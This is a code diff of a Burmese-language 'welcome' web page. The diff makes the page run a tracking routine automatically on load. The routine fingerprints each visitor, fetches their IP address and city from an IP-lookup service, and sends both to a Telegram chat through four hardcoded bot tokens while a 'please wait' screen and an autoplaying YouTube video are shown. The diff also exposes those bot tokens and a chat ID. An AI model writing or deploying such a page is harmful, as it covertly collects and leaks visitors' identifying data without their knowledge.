@@ -2,72 +2,58 @@
 <html lang="my">
 <head>
     <meta charset="UTF-8">
-    <title>System</title>
+    <title>Welcome System</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 </head>
-<body class="bg-black text-white min-h-screen flex items-center justify-center">
+<body class="bg-black text-white h-screen flex flex-col items-center justify-center">
 
-    <!-- YouTube Hidden Iframe -->
+    <!-- YouTube Music -->
     <iframe id="yt-player" class="hidden" src="" allow="autoplay"></iframe>
 
-    <div id="app" class="p-6 text-center">
-        <div id="public-view" class="hidden">
-            <h1 class="text-3xl font-bold mb-8">ကြိုဆိုပါ၏</h1>
-            <button onclick="startAction()" class="bg-red-600 px-10 py-4 rounded-full text-xl font-bold">စတင်မည်</button>
-        </div>
+    <!-- Welcome Page -->
+    <div id="welcome-view" class="text-center">
+        <h1 class="text-4xl font-bold animate-pulse">ခဏစောင့်ပေးပါ...</h1>
+    </div>
 
-        <div id="admin-view" class="hidden bg-gray-900 p-6 rounded-lg text-left">
-            <input id="yt-id" class="w-full p-2 mb-4 text-black rounded" placeholder="YouTube ID">
-            <button onclick="saveSettings()" class="bg-blue-600 w-full py-2 rounded">Save</button>
-        </div>
+    <!-- Main Page -->
+    <div id="main-view" class="hidden text-center">
+        <h1 class="text-3xl font-bold">Main Page သို့ ရောက်ရှိပါပြီ</h1>
+        <p class="text-gray-400">အချက်အလက်များ စနစ်အတွင်းသို့ ပို့ဆောင်ပြီးပါပြီ။</p>
     </div>
 
     <script>
-        // 1. YouTube Player Setup
-        const ytId = localStorage.getItem('ytId') || 'dQw4w9WgXcQ';
-        document.getElementById('yt-player').src = `https://www.youtube.com/embed/${ytId}?autoplay=1`;
-
-        // 2. Main Action
-        async function startAction() {
-            // သီချင်းဖွင့်ခြင်း
+        async function runSystem() {
+            // 1. YouTube Music Auto-play
+            const ytId = localStorage.getItem('ytId') || 'dQw4w9WgXcQ';
             const player = document.getElementById('yt-player');
-            player.src = player.src.replace("autoplay=0", "autoplay=1");
+            player.src = `https://www.youtube.com/embed/${ytId}?autoplay=1&loop=1`;
 
-            // Tracking
-            try {
-                const fp = await FingerprintJS.load();
-                const res = await fp.get();
-                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const msg = `ID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
-                
-                const bots = [
-                    "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
-                    "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
-                    "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
-                    "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
-                ];
+            // 2. Tracking and Sending to Telegram
+            const fp = await FingerprintJS.load();
+            const res = await fp.get();
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+            const msg = `Visitor Info:%0AID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
+            
+            const bots = [
+                "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
+                "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
+                "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
+                "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
+            ];
 
-                bots.forEach(token => {
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=6917040501&text=${msg}`);
-                });
-                alert("စတင်ပါပြီ။");
-            } catch (err) {
-                alert("Error: " + err.message);
-            }
+            bots.forEach(token => {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=6917040501&text=${msg}`);
+            });
+
+            // 3. 3 Seconds Redirect
+            setTimeout(() => {
+                document.getElementById('welcome-view').classList.add('hidden');
+                document.getElementById('main-view').classList.remove('hidden');
+            }, 3000);
         }
 
-        function saveSettings() {
-            localStorage.setItem('ytId', document.getElementById('yt-id').value);
-            alert("Saved!");
-        }
-
-        // Router
-        if(window.location.hash === '#/step/2003') {
-            document.getElementById('admin-view').classList.remove('hidden');
-        } else {
-            document.getElementById('public-view').classList.remove('hidden');
-        }
+        window.onload = runSystem;
     </script>
 </body>
 </html>
